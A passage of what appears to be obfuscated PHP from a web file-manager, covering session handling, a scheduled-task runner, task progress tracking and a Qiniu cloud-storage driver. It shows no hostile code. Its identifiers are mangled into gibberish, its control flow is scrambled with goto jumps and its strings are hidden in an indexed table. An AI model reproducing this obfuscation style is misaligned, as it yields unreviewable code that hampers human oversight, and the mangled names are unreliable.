$b´ŒÏ²İÉ = new self(); goto D„‘î´£¿£; D„‘î´£¿£: return $b´ŒÏ²İÉ; goto BœœÃ´·; cœí¹®ÖË‡: $då˜àÛ¤é = $GLOBALS[$Eå™•‘É´ê[6]][$Eå™•‘É´ê[337]]; self::$sessionTime = $då˜àÛ¤é[$Eå™•‘É´ê[1405]]; $EÄ—¾»ÖÔ = SESSION_ID; goto céß¡Â§Š´; bÑÎŒÙÒæÌ: $E¾ß××Ş“ = $då˜àÛ¤é[$Eå™•‘É´ê[1407]]; $cğŞñ…‰èÃ = $då˜àÛ¤é[$E¾ß××Ş“]; $eĞ–«Â™·› = $då˜àÛ¤é[$Eå™•‘É´ê[759]]; goto d§ÜõµŞã; BœœÃ´·: } public static function sign($Aëçæ´Œ … = false) { $Aëçæ´Œ … && (self::$sessionSign = $Aëçæ´Œ …); self::init(); return self::$sessionSign; } public static function set($eÉš¨‰‰¥•, $FæÈÚ…£ä˜ = false) { self::init(); if (is_array($eÉš¨‰‰¥•)) { foreach ($eÉš¨‰‰¥• as $Aê±Ë–„…Ö => $Fùáîµò¿¬) { array_set_value(self::$data, $Aê±Ë–„…Ö, $Fùáîµò¿¬); } } else { array_set_value(self::$data, $eÉš¨‰‰¥•, $FæÈÚ…£ä˜); } CacheLock::lock(self::$sessionSign); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); CacheLock::unlock(self::$sessionSign); } public static function get($cãÂ˜¶ëƒµ = false) { self::init(); if (!$cãÂ˜¶ëƒµ) { return self::$data; } return array_get_value(self::$data, $cãÂ˜¶ëƒµ); } public static function remove($eàôš¿ÙïÕ) { self::init(); unset(self::$data[$eàôš¿ÙïÕ]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[³‘’¼äÑ™ÔÍ][764])) { self::$handle->clearTimeout(); } } } class AutoTask { public static function start() { goto Açƒµ…ß; Açƒµ…ß: $cÂè»ŒŸå =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (self::valueGet($cÂè»ŒŸå[692]) != $cÂè»ŒŸå[83]) { return; } if (self::valueGet($cÂè»ŒŸå[1409]) == $cÂè»ŒŸå[83]) { $Cˆ´ÇÏ©¯Ë = self::valueGet($cÂè»ŒŸå[1410]); if (time() - $Cˆ´ÇÏ©¯Ë > 3600 * 2) { self::restart(); } return; } goto Dò‡è¶ò§Ô; a‹Î¹Ü¶’™: while (!0) { self::cacheClear(); if (self::valueGet($cÂè»ŒŸå[692]) != $cÂè»ŒŸå[83]) { self::valueSet($cÂè»ŒŸå[1409], $cÂè»ŒŸå[468]); self::log($cÂè»ŒŸå[1413]); die; } self::valueSet($cÂè»ŒŸå[1409], $cÂè»ŒŸå[83]); self::valueSet($cÂè»ŒŸå[1410], time()); self::taskRunAll(); sleep(self::valueGet($cÂè»ŒŸå[1414])); } goto Bš¡²ªÉ†œ; Dò‡è¶ò§Ô: http_close(); self::valueSet($cÂè»ŒŸå[1409], $cÂè»ŒŸå[83]); Hook::bind($cÂè»ŒŸå[1411], $cÂè»ŒŸå[1412]); goto a‹Î¹Ü¶’™; Bš¡²ªÉ†œ: } public static function restart() { $Dè™à•è =& $_SERVER[³‘’¼äÑ™ÔÍ]; http_close(); self::valueSet($Dè™à•è[692], $Dè™à•è[468]); sleep(self::valueGet($Dè™à•è[1414]) + 5); self::valueSet($Dè™à•è[1409], $Dè™à•è[468]); self::valueSet($Dè™à•è[692], $Dè™à•è[83]); } public static function shutdownEvent() { $d­Ÿµà³° =& $_SERVER[³‘’¼äÑ™ÔÍ]; self::valueSet($d­Ÿµà³°[1409], $d­Ÿµà³°[468]); self::log($d­Ÿµà³°[1415]); } public static function config($A†¬Â¤Œ›Ö, $Dó¼Ôë¥ç¯) { $fÜ °ìµ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $dĞºÖÈ‹£” = 20; $Dó¼Ôë¥ç¯ = intval($Dó¼Ôë¥ç¯) <= $dĞºÖÈ‹£” ? $dĞºÖÈ‹£” : intval($Dó¼Ôë¥ç¯); self::valueSet($fÜ °ìµ[692], $A†¬Â¤Œ›Ö); self::valueSet($fÜ °ìµ[1414], $Dó¼Ôë¥ç¯); } private static function taskRunAll() { $A•‰Ã¹÷¿ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $böƒğÜ‡Ÿ„ = Model($A•‰Ã¹÷¿[1416])->listData(); $C´˜Î¢ ñ = count($böƒğÜ‡Ÿ„); for ($Bà–÷ˆŠõ  = 0; $Bà–÷ˆŠõ  < $C´˜Î¢ ñ; $Bà–÷ˆŠõ ++) { $Aˆ¦ö³â”Ä = $böƒğÜ‡Ÿ„[$Bà–÷ˆŠõ ]; if ($Aˆ¦ö³â”Ä[$A•‰Ã¹÷¿[1417]] != $A•‰Ã¹÷¿[83]) { continue; } if (!self::taskTimeCheck($Aˆ¦ö³â”Ä)) { continue; } self::taskRun($Aˆ¦ö³â”Ä); } Hook::trigger($A•‰Ã¹÷¿[1418]); } private static function taskTimeCheck($FÃ„„Á‹Ñˆ) { goto C•™Ï¸¤‰; C•™Ï¸¤‰: $e´é’ˆ˜Üâ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Cè¸Æ’ó½ = json_decode($FÃ„„Á‹Ñˆ[$e´é’ˆ˜Üâ[190]], !0); $B‹¡Ï—ÚÑ = intval($FÃ„„Á‹Ñˆ[$e´é’ˆ˜Üâ[1410]]); goto c²ÖøôÇš; f ÷®Œ•: switch ($Cè¸Æ’ó½[$e´é’ˆ˜Üâ[29]]) { case $e´é’ˆ˜Üâ[1425]: if (time() - $B‹¡Ï—ÚÑ < 3600 * 24 * 30) { return !1; } if ($Cè¸Æ’ó½[$e´é’ˆ˜Üâ[1425]] == date($e´é’ˆ˜Üâ[1426]) && $fÀŸß…÷´­) { return !0; } break; case $e´é’ˆ˜Üâ[1427]: if (time() - $B‹¡Ï—ÚÑ < 3600 * 24 * 7) { return !1; } $D™«ÇŒœ°é = date($e´é’ˆ˜Üâ[1428]) == 0 ? 7 : date($e´é’ˆ˜Üâ[1428]); if ($Cè¸Æ’ó½[$e´é’ˆ˜Üâ[1427]] == $D™«ÇŒœ°é && $fÀŸß…÷´­) { return !0; } break; case $e´é’ˆ˜Üâ[1420]: if (time() - $B‹¡Ï—ÚÑ < 3600 * 24) { return !1; } if ($fÀŸß…÷´­) { return !0; } break; case $e´é’ˆ˜Üâ[1429]: if (time() - $B‹¡Ï—ÚÑ >= floatval($Cè¸Æ’ó½[$e´é’ˆ˜Üâ[1429]]) * 60) { return !0; } break; default: break; } return !1; goto fªŸì¹ôŞŒ; c²ÖøôÇš: $E…òËÄ = strtotime($e´é’ˆ˜Üâ[1419] . $Cè¸Æ’ó½[$e´é’ˆ˜Üâ[1420]] . $e´é’ˆ˜Üâ[1421]) - strtotime($e´é’ˆ˜Üâ[1422]); $f÷ƒİØ‰ô = time() - strtotime(date($e´é’ˆ˜Üâ[1423]) . $e´é’ˆ˜Üâ[1424]); $fÀŸß…÷´­ = $f÷ƒİØ‰ô >= $E…òËÄ && $f÷ƒİØ‰ô <= $E…òËÄ + 3600; goto f ÷®Œ•; fªŸì¹ôŞŒ: } public static function taskRun($CõÂœõŒ¯) { goto C­”Äñ­­; AØĞ„Æœã: Model($A§Ñ·èˆŞ™[1434])->add(array($A§Ñ·èˆŞ™[1435] => $A§Ñ·èˆŞ™[33], $A§Ñ·èˆŞ™[1436] => $A§Ñ·èˆŞ™[468], $A§Ñ·èˆŞ™[29] => $A§Ñ·èˆŞ™[1437] . $CõÂœõŒ¯[$A§Ñ·èˆŞ™[367]], $A§Ñ·èˆŞ™[1438] => json_encode(array($A§Ñ·èˆŞ™[28] => $CõÂœõŒ¯[$A§Ñ·èˆŞ™[28]], $A§Ñ·èˆŞ™[1439] => timeFloat() - $e•ìöÃ¨‚¿, $A§Ñ·èˆŞ™[281] => $d›Â¯¶À¦í)))); self::log($A§Ñ·èˆŞ™[1440] . $CõÂœõŒ¯[$A§Ñ·èˆŞ™[367]] . $A§Ñ·èˆŞ™[1441] . $d›Â¯¶À¦í); return !0; goto cÆò¯¾á§‡; C­”Äñ­­: $A§Ñ·èˆŞ™ =& $_SERVER[³‘’¼äÑ™ÔÍ]; self::log($A§Ñ·èˆŞ™[1430] . $CõÂœõŒ¯[$A§Ñ·èˆŞ™[367]] . $A§Ñ·èˆŞ™[1431] . $CõÂœõŒ¯[$A§Ñ·èˆŞ™[28]] . $A§Ñ·èˆŞ™[1432] . $CõÂœõŒ¯[$A§Ñ·èˆŞ™[1433]]); Model($A§Ñ·èˆŞ™[1416])->run($CõÂœõŒ¯[$A§Ñ·èˆŞ™[367]]); goto E°ŠĞÎÍ¬; E°ŠĞÎÍ¬: $e•ìöÃ¨‚¿ = timeFloat(); $d›Â¯¶À¦í = $A§Ñ·èˆŞ™[33]; switch ($CõÂœõŒ¯[$A§Ñ·èˆŞ™[29]]) { case $A§Ñ·èˆŞ™[295]: $F˜½‡¼åŸ = url_request($CõÂœõŒ¯[$A§Ñ·èˆŞ™[1433]], $A§Ñ·èˆŞ™[216], !1, !1, !1, !1, 5); $d›Â¯¶À¦í = strlen($F˜½‡¼åŸ); break; case $A§Ñ·èˆŞ™[215]: $d›Â¯¶À¦í = Hook::apply($CõÂœõŒ¯[$A§Ñ·èˆŞ™[1433]]); default: break; } goto AØĞ„Æœã; cÆò¯¾á§‡: } private static function valueGet($EÍáøŸ–¸) { $D…µ‹ï²Òç =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Fµ§ÌñÖ¸à = $D…µ‹ï²Òç[1442]; $a°¢è ùã— = Model($D…µ‹ï²Òç[1443])->get($EÍáøŸ–¸, $Fµ§ÌñÖ¸à); if (is_null($a°¢è ùã—)) { Model($D…µ‹ï²Òç[1443])->set($D…µ‹ï²Òç[1414], 10, $Fµ§ÌñÖ¸à); Model($D…µ‹ï²Òç[1443])->set($D…µ‹ï²Òç[692], $D…µ‹ï²Òç[83], $Fµ§ÌñÖ¸à); Model($D…µ‹ï²Òç[1443])->set($D…µ‹ï²Òç[1409], $D…µ‹ï²Òç[468], $Fµ§ÌñÖ¸à); $a°¢è ùã— = Model($D…µ‹ï²Òç[1443])->get($EÍáøŸ–¸, $Fµ§ÌñÖ¸à); } return $a°¢è ùã—; } private static function valueSet($cçˆŞ”ÇÖÒ, $d“„Ù‡ÁÏ) { $cï¥Ğ„Ù² =& $_SERVER[³‘’¼äÑ™ÔÍ]; return Model($cï¥Ğ„Ù²[1443])->set($cçˆŞ”ÇÖÒ, $d“„Ù‡ÁÏ, $cï¥Ğ„Ù²[1442]); } protected static function log($BÁ“…ø´¦ó) { write_log($BÁ“…ø´¦ó, $_SERVER[³‘’¼äÑ™ÔÍ][1444]); } private static function cacheClear() { $déô½Ûî÷‰ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $E›ÁĞ•À‰„ = Model($déô½Ûî÷‰[1443])->cacheKey($déô½Ûî÷‰[1442]); Cache::clearMemory($E›ÁĞ•À‰„); } } class Task { const STATYS_STOP = "\163\164\x6f\160"; const STATYS_RUNNING = "\x72\x75\x6e\156\151\156\147"; const STATYS_KILL = "\153\151\x6c\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($AÊìëÚ‘¨, $dóáÓ¸¤‘Ù = '', $d”áÎæó¦Ş = 0, $Aéëíôç¹‰ = '') { goto cØ¨ï†÷­; Fõß¯ä‡äİ: Hook::trigger($aÇ¶ÜŒ˜åÀ[1456], $this->task); $this->task[$aÇ¶ÜŒ˜åÀ[1450]] = timeFloat(); goto c–—Ğ’äŠŠ; cØ¨ï†÷­: $aÇ¶ÜŒ˜åÀ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (self::get($AÊìëÚ‘¨)) { return; } $this->task = array($aÇ¶ÜŒ˜åÀ[367] => $AÊìëÚ‘¨, $aÇ¶ÜŒ˜åÀ[1445] => USER_ID, $aÇ¶ÜŒ˜åÀ[1351] => $Aéëíôç¹‰, $aÇ¶ÜŒ˜åÀ[29] => $dóáÓ¸¤‘Ù, $aÇ¶ÜŒ˜åÀ[982] => $aÇ¶ÜŒ˜åÀ[33], $aÇ¶ÜŒ˜åÀ[980] => $d”áÎæó¦Ş, $aÇ¶ÜŒ˜åÀ[994] => 0, $aÇ¶ÜŒ˜åÀ[1446] => 0, $aÇ¶ÜŒ˜åÀ[1447] => 0, $aÇ¶ÜŒ˜åÀ[1448] => timeFloat(), $aÇ¶ÜŒ˜åÀ[1449] => 0, $aÇ¶ÜŒ˜åÀ[1450] => 0, $aÇ¶ÜŒ˜åÀ[1451] => 0, $aÇ¶ÜŒ˜åÀ[1452] => 0, $aÇ¶ÜŒ˜åÀ[692] => $aÇ¶ÜŒ˜åÀ[1409]); goto CÓ‹¶¬Öƒ; CÓ‹¶¬Öƒ: Hook::bind($aÇ¶ÜŒ˜åÀ[1411], array($this, $aÇ¶ÜŒ˜åÀ[1453])); Hook::bind($aÇ¶ÜŒ˜åÀ[1454], array($this, $aÇ¶ÜŒ˜åÀ[1455])); $this->startAfter(); goto Fõß¯ä‡äİ; c–—Ğ’äŠŠ: } public function end() { goto dÍ×ªóª‹§; d®Îì‚¤‹‡: $AØ¹Î˜Õ¾† = timeFloat() - $this->task[$Bİ íªê³Ø[1448]]; self::log($Bİ íªê³Ø[1457] . $this->task[$Bİ íªê³Ø[367]] . $Bİ íªê³Ø[1458] . $AØ¹Î˜Õ¾† . $Bİ íªê³Ø[1459]); Hook::unbind($Bİ íªê³Ø[1411], array($this, $Bİ íªê³Ø[1453])); goto AƒÇ†ßäÈ; AƒÇ†ßäÈ: Hook::unbind($Bİ íªê³Ø[1454], array($this, $Bİ íªê³Ø[1455])); $this->endAfter(); $this->task = !1; goto cë¶¬÷¿¯; dÍ×ªóª‹§: $Bİ íªê³Ø =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$this->task) { return; } if ($this->task[$Bİ íªê³Ø[1450]]) { self::valueSet($this->task[$Bİ íªê³Ø[367]], !1); } goto d®Îì‚¤‹‡; cë¶¬÷¿¯: } public function update($f¾É´ÚÆ± = 0) { goto DØÛŠš¤¹; E”êÉÍ: Hook::trigger($b¡ó¸Ïê Ä[1463], $fíÚ†øá“…); self::valueSet($fíÚ†øá“…[$b¡ó¸Ïê Ä[367]], $fíÚ†øá“…); goto a«¦„Æèôâ; AÙ´Ñùè¶: $fíÚ†øá“…[$b¡ó¸Ïê Ä[994]] += $f¾É´ÚÆ±; $fíÚ†øá“…[$b¡ó¸Ïê Ä[1449]] = timeFloat(); if ($fíÚ†øá“…[$b¡ó¸Ïê Ä[980]]) { if ($fíÚ†øá“…[$b¡ó¸Ïê Ä[980]] < $fíÚ†øá“…[$b¡ó¸Ïê Ä[994]]) { $fíÚ†øá“…[$b¡ó¸Ïê Ä[980]] = $fíÚ†øá“…[$b¡ó¸Ïê Ä[994]]; } $a¨ÛğôÌ³½ = timeFloat() - $fíÚ†øá“…[$b¡ó¸Ïê Ä[1448]] - $fíÚ†øá“…[$b¡ó¸Ïê Ä[1451]]; $fíÚ†øá“…[$b¡ó¸Ïê Ä[1446]] = $fíÚ†øá“…[$b¡ó¸Ïê Ä[994]] / $fíÚ†øá“…[$b¡ó¸Ïê Ä[980]]; $fíÚ†øá“…[$b¡ó¸Ïê Ä[1447]] = $fíÚ†øá“…[$b¡ó¸Ïê Ä[994]] / $a¨ÛğôÌ³½; if ($fíÚ†øá“…[$b¡ó¸Ïê Ä[1446]] > 0) { $fíÚ†øá“…[$b¡ó¸Ïê Ä[1452]] = $a¨ÛğôÌ³½ * (1 - $fíÚ†øá“…[$b¡ó¸Ïê Ä[1446]]) / $fíÚ†øá“…[$b¡ó¸Ïê Ä[1446]]; } $fíÚ†øá“…[$b¡ó¸Ïê Ä[1452]] = $fíÚ†øá“…[$b¡ó¸Ïê Ä[1452]] <= 0 ? 0 : $fíÚ†øá“…[$b¡ó¸Ïê Ä[1452]]; } goto a­äè‘ëƒ; c¨ø¤İïŠå: $DèïŠ™™Šè = self::get($fíÚ†øá“…[$b¡ó¸Ïê Ä[367]]); $Bè‰ŸŸô· = $DèïŠ™™Šè[$b¡ó¸Ïê Ä[692]]; if ($Bè‰ŸŸô· == self::STATYS_KILL) { $b¿»ø¶‹ì = array($b¡ó¸Ïê Ä[1460] => LNG($b¡ó¸Ïê Ä[1461]), $b¡ó¸Ïê Ä[1036] => !1); Cache::set($b¡ó¸Ïê Ä[1462] . $this->task[$b¡ó¸Ïê Ä[367]], $b¿»ø¶‹ì, 30); $this->end(); die; } else { if ($Bè‰ŸŸô· == self::STATYS_STOP) { $DÈÁ¹¹‹Š = 2; $DèïŠ™™Šè[$b¡ó¸Ïê Ä[1451]] += $DÈÁ¹¹‹Š; self::valueSet($fíÚ†øá“…[$b¡ó¸Ïê Ä[367]], $DèïŠ™™Šè); sleep($DÈÁ¹¹‹Š); $this->update(); return; } } goto Aš£—¹éå–; Aš£—¹éå–: $fíÚ†øá“…[$b¡ó¸Ïê Ä[692]] = $Bè‰ŸŸô· ? $Bè‰ŸŸô· : $fíÚ†øá“…[$b¡ó¸Ïê Ä[692]]; $fíÚ†øá“…[$b¡ó¸Ïê Ä[1451]] = $DèïŠ™™Šè[$b¡ó¸Ïê Ä[1451]] ? $DèïŠ™™Šè[$b¡ó¸Ïê Ä[1451]] : 0; $fíÚ†øá“…[$b¡ó¸Ïê Ä[1450]] = timeFloat(); goto E”êÉÍ; a­äè‘ëƒ: $this->updateAfter(); $C‘ĞŒ—ØÍ‡ = 0.2; if (timeFloat() - $fíÚ†øá“…[$b¡ó¸Ïê Ä[1450]] < $C‘ĞŒ—ØÍ‡) { return; } goto c¨ø¤İïŠå; DØÛŠš¤¹: $b¡ó¸Ïê Ä =& $_SERVER[³‘’¼äÑ™ÔÍ]; $fíÚ†øá“… =& $this->task; if (!$fíÚ†øá“…) { return; } goto AÙ´Ñùè¶; a«¦„Æèôâ: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($dãÃÎíëÀÅ) { $EÌÏ¦¹…¹¤ =& $_SERVER[³‘’¼äÑ™ÔÍ]; Cache::set($EÌÏ¦¹…¹¤[1462] . $this->task[$EÌÏ¦¹…¹¤[367]], $dãÃÎíëÀÅ, 60); return $dãÃÎíëÀÅ; } public static function get($dŠòô¤ª½•) { return self::valueGet($dŠòô¤ª½•); } public static function listData() { $aÊ‘‰ÕôÈ = self::valueGet(); return array_sort_by($aÊ‘‰ÕôÈ, $_SERVER[³‘’¼äÑ™ÔÍ][1448], !0); } public static function kill($eŸ‰†´Ò°‡) { return self::changeStatus($eŸ‰†´Ò°‡, self::STATYS_KILL); } public static function stop($a‡’ù¦„Şé) { return self::changeStatus($a‡’ù¦„Şé, self::STATYS_STOP); } public static function restart($cëš¾¶Ÿ®Ê) { return self::changeStatus($cëš¾¶Ÿ®Ê, self::STATYS_RUNNING); } public static function killAll() { $d†Ğ°¬÷÷† =& $_SERVER[³‘’¼äÑ™ÔÍ]; $e ³Õİ¦¹ = self::listData(); foreach ($e ³Õİ¦¹ as $E“æŞ°ßÔ‘) { self::kill($E“æŞ°ßÔ‘[$d†Ğ°¬÷÷†[367]]); } sleep(2); foreach ($e ³Õİ¦¹ as $E“æŞ°ßÔ‘) { self::valueSet($E“æŞ°ßÔ‘[$d†Ğ°¬÷÷†[367]], !1); } } private static function changeStatus($eÒÄĞ‹œéƒ, $e†…©òóÈ¦) { goto Bšàø‚¿À¿; f÷ñºëÜÛ: return !0; goto eÉ¾³†½ï; Bšàø‚¿À¿: $Có¸ø¸Ï =& $_SERVER[³‘’¼äÑ™ÔÍ]; $Cêñ¬Êóšõ = self::valueGet($eÒÄĞ‹œéƒ); if (!$Cêñ¬Êóšõ) { return !1; } goto E›Ì™ñ‡¢; E›Ì™ñ‡¢: $Cêñ¬Êóšõ[$Có¸ø¸Ï[692]] = $e†…©òóÈ¦; self::valueSet($eÒÄĞ‹œéƒ, $Cêñ¬Êóšõ); self::log($Có¸ø¸Ï[1464] . $Cêñ¬Êóšõ[$Có¸ø¸Ï[367]] . $Có¸ø¸Ï[1465] . $e†…©òóÈ¦); goto f÷ñºëÜÛ; eÉ¾³†½ï: } public static function valueGet($A¹ÌÁ‘  = false) { $a»ºÓ±¦É =& $_SERVER[³‘’¼äÑ™ÔÍ]; if ($A¹ÌÁ‘ ) { $D÷Å¿ö™¹¸ = Model($a»ºÓ±¦É[399])->where(array($a»ºÓ±¦É[89] => $A¹ÌÁ‘ , $a»ºÓ±¦É[29] => $a»ºÓ±¦É[1466]))->find(); return $D÷Å¿ö™¹¸ ? json_decode($D÷Å¿ö™¹¸[$a»ºÓ±¦É[359]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($D¶Ïñ”›ˆ— = false) { goto b¡›±ÛŞ…è; e ò×ö¾Î: $eğŠ†óÀ©Ü = Model($e…Ïï¨Šä[399])->where($eµ‘ÍÁÁ½Š)->select(); $eğŠ†óÀ©Ü = $eğŠ†óÀ©Ü ? $eğŠ†óÀ©Ü : array(); foreach ($eğŠ†óÀ©Ü as $cá÷ùÒÓÅƒ => $f‰ÍÄÎòã) { $eğŠ†óÀ©Ü[$cá÷ùÒÓÅƒ] = json_decode($f‰ÍÄÎòã[$e…Ïï¨Šä[359]], !0); } goto A›çØ‹¾; b¡›±ÛŞ…è: $e…Ïï¨Šä =& $_SERVER[³‘’¼äÑ™ÔÍ]; $eµ‘ÍÁÁ½Š = array($e…Ïï¨Šä[29] => $e…Ïï¨Šä[1466]); if ($D¶Ïñ”›ˆ—) { $eµ‘ÍÁÁ½Š[$e…Ïï¨Šä[1445]] = $D¶Ïñ”›ˆ—; } goto e ò×ö¾Î; A›çØ‹¾: return $eğŠ†óÀ©Ü; goto DˆÏÈ®ª—; DˆÏÈ®ª—: } public static function valueSet($d˜éŸÀèÖ¢, $F—ª”ÙÁÅ) { goto bŸé£™Êâë; CêªÒ²É´: Model($B¯‚ÔšÔ…­[399])->add($B‘¾É„§†, array(), !0); goto DÌ–Ûõ°“»; bŸé£™Êâë: $B¯‚ÔšÔ…­ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$F—ª”ÙÁÅ) { return Model($B¯‚ÔšÔ…­[399])->where(array($B¯‚ÔšÔ…­[89] => $d˜éŸÀèÖ¢, $B¯‚ÔšÔ…­[29] => $B¯‚ÔšÔ…­[1466]))->delete(); } $AëŠ¤Ô“¥ = json_encode($F—ª”ÙÁÅ); goto E»ÅÙÊÑ°; E»ÅÙÊÑ°: if (!$AëŠ¤Ô“¥) { ob_start(); var_dump($F—ª”ÙÁÅ); $FçğíÑ…‰ = ob_get_clean(); self::log($B¯‚ÔšÔ…­[1467] . json_encode_force($FçğíÑ…‰)); } if (!$d˜éŸÀèÖ¢ || !$F—ª”ÙÁÅ[$B¯‚ÔšÔ…­[367]]) { return !1; } $B‘¾É„§† = array($B¯‚ÔšÔ…­[29] => $B¯‚ÔšÔ…­[1466], $B¯‚ÔšÔ…­[1445] => USER_ID, $B¯‚ÔšÔ…­[89] => $d˜éŸÀèÖ¢, $B¯‚ÔšÔ…­[359] => $AëŠ¤Ô“¥); goto CêªÒ²É´; DÌ–Ûõ°“»: } public static function log($f‚™”µŠŒ‡) { write_log($f‚™”µŠŒ‡, $_SERVER[³‘’¼äÑ™ÔÍ][1468]); } } goto bß¸¢…Æë; D»íŸ•àÖ³: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($AŠîÎ÷´Ëˆ) { parent::__construct(); require_once SDK_DIR . $_SERVER[³‘’¼äÑ™ÔÍ][1218]; $this->_init($AŠîÎ÷´Ëˆ); } public function _init($bÚ¾«²“öâ) { foreach ($bÚ¾«²“öâ as $D°„ÒÒ²À¹ => $AïÕ‘îßÃØ) { if (isset($this->{$D°„ÒÒ²À¹})) { $this->{$D°„ÒÒ²À¹} = $AïÕ‘îßÃØ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { show_json($_SERVER[³‘’¼äÑ™ÔÍ][1219], !1); } $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($aµÏ‘¥İò‡, $C‰íÏÂÕ¤ = '', $c»¤…ù°¢ = REPEAT_RENAME) { if ($this->setContent($aµÏ‘¥İò‡, $C‰íÏÂÕ¤)) { return $this->getPathOuter($aµÏ‘¥İò‡); } return !1; } public function mkdir($d©¹ÔùÄƒê, $D‚ôâººáˆ = REPEAT_SKIP) { goto dè¥Ù™¿; fÒàŞÍ˜¥: $d©¹ÔùÄƒê = $D ·â—åï™ . $DÊ£…ä¼Áô[8]; $BÔæà¥¦¤´ = get_path_this($D ·â—åï™); $E¤òßŒâ¡ = $d©¹ÔùÄƒê . $BÔæà¥¦¤´; goto Aô©ßˆ‰…ß; dè¥Ù™¿: $DÊ£…ä¼Áô =& $_SERVER[³‘’¼äÑ™ÔÍ]; $D ·â—åï™ = trim($d©¹ÔùÄƒê, $DÊ£…ä¼Áô[8]); if ($this->_isFolder($D ·â—åï™)) { return $this->getPathOuter($D ·â—åï™); } goto fÒàŞÍ˜¥; Aô©ßˆ‰…ß: if (!$this->mkfile($E¤òßŒâ¡)) { return !1; } if (!$this->moveFile($E¤òßŒâ¡, $d©¹ÔùÄƒê)) { $this->delFile($E¤òßŒâ¡); return !1; } return $this->getPathOuter($D ·â—åï™); goto dÆìİ»ìÖ˜; dÆìİ»ìÖ˜: } public function copyFile($e÷µÏŞÚÓÏ, $E†œŠ‚¸Æê) { $d¾¨±±ÇÈ = $this->bucketManager->copy($this->bucket, $e÷µÏŞÚÓÏ, $this->bucket, $E†œŠ‚¸Æê, !0); return $d¾¨±±ÇÈ ? !1 : $this->getPathOuter($E†œŠ‚¸Æê); } public function moveFile($AÂÌ˜ô÷ŠŒ, $BÆ²Í»‰Í) { $b¡¶ø˜ëÃ  = $this->bucketManager->move($this->bucket, $AÂÌ˜ô÷ŠŒ, $this->bucket, $BÆ²Í»‰Í, !0); return $b¡¶ø˜ëÃ  ? !1 : $this->getPathOuter($BÆ²Í»‰Í); } public function delFile($d§·— Ã½) { $bƒŒğ¤¨Å = $this->bucketManager->delete($this->bucket, $d§·— Ã½); return $bƒŒğ¤¨Å ? !1 : !0; } public function delFolder($FÒ¥ğ±©Ô) { $f©Ï·ùŠº = $this->fileList($FÒ¥ğ±©Ô); if (empty($f©Ï·ùŠº)) { return !0; } $DÎÍéê¹Â = 1000; if (count($f©Ï·ùŠº) <= $DÎÍéê¹Â) { return $this->qnDelObj($f©Ï·ùŠº) ? !1 : !0; } foreach (array_chunk($f©Ï·ùŠº, $DÎÍéê¹Â) as $e‰ÆÌ£Î“Ï) { $BĞ«Ø£íê° = $this->qnDelObj($e‰ÆÌ£Î“Ï); if ($BĞ«Ø£íê°) { return !1; } } return !0; } private function qnDelObj($D¿‹¹ö§™ç) { $bø‡ŞÓÅÂÀ = $this->bucketManager->buildBatchDelete($this->bucket, $D¿‹¹ö§™ç); list($bËõĞ¼ï„…, $F­Å„ù·) = $this->bucketManager->batch($bø‡ŞÓÅÂÀ); return $F­Å„ù·; } private function fileList($eÈğí‡ñä, $A¡…Úœ‚î = 0) { goto Eäùä‹°ÇÊ; DåÀß—«: $fª™ì†õœ• = array(); while (!0) { list($dŒ¿ÛÛš¼, $e»·ø·Å›‡) = $this->bucketManager->listFiles($this->bucket, $E§¬åïÄÃ, $bÊ ‡â·²Û, $bŒíÊ³©¿ø, $f°äìÜÉ®Ò); if ($e»·ø·Å›‡) { return !1; } $bÊ ‡â·²Û = array_key_exists($EŒƒ‘å¹©[1189], $dŒ¿ÛÛš¼) ? $bÊ ‡â·²Û = $dŒ¿ÛÛš¼[$EŒƒ‘å¹©[1220]] : $EŒƒ‘å¹©[33]; foreach ($dŒ¿ÛÛš¼[$EŒƒ‘å¹©[1221]] as $FÄ÷ÍŠÕœï) { $dŒòÒ±»ƒª = $FÄ÷ÍŠÕœï[$EŒƒ‘å¹©[89]]; if ($A¡…Úœ‚î) { $dŒòÒ±»ƒª = array($EŒƒ‘å¹©[28] => $dŒòÒ±»ƒª, $EŒƒ‘å¹©[77] => $FÄ÷ÍŠÕœï[$EŒƒ‘å¹©[1222]]); } $fª™ì†õœ•[] = $dŒòÒ±»ƒª; } if ($bÊ ‡â·²Û == $EŒƒ‘å¹©[33]) { break; } } return $fª™ì†õœ•; goto e™Å™šÍæ†; Eäùä‹°ÇÊ: $EŒƒ‘å¹© =& $_SERVER[³‘’¼äÑ™ÔÍ]; $eÈğí‡ñä = trim($eÈğí‡ñä, $EŒƒ‘å¹©[8]); $E§¬åïÄÃ = empty($eÈğí‡ñä) ? $EŒƒ‘å¹©[33] : $eÈğí‡ñä . $EŒƒ‘å¹©[8]; goto c­×•·ÚÇ¯; c­×•·ÚÇ¯: $bÊ ‡â·²Û = $EŒƒ‘å¹©[33]; $bŒíÊ³©¿ø = 1000; $f°äìÜÉ®Ò = $EŒƒ‘å¹©[33]; goto DåÀß—«; e™Å™šÍæ†: } public function rename($a‹š¸º­ß¢, $fË™Ë’²¿) { return 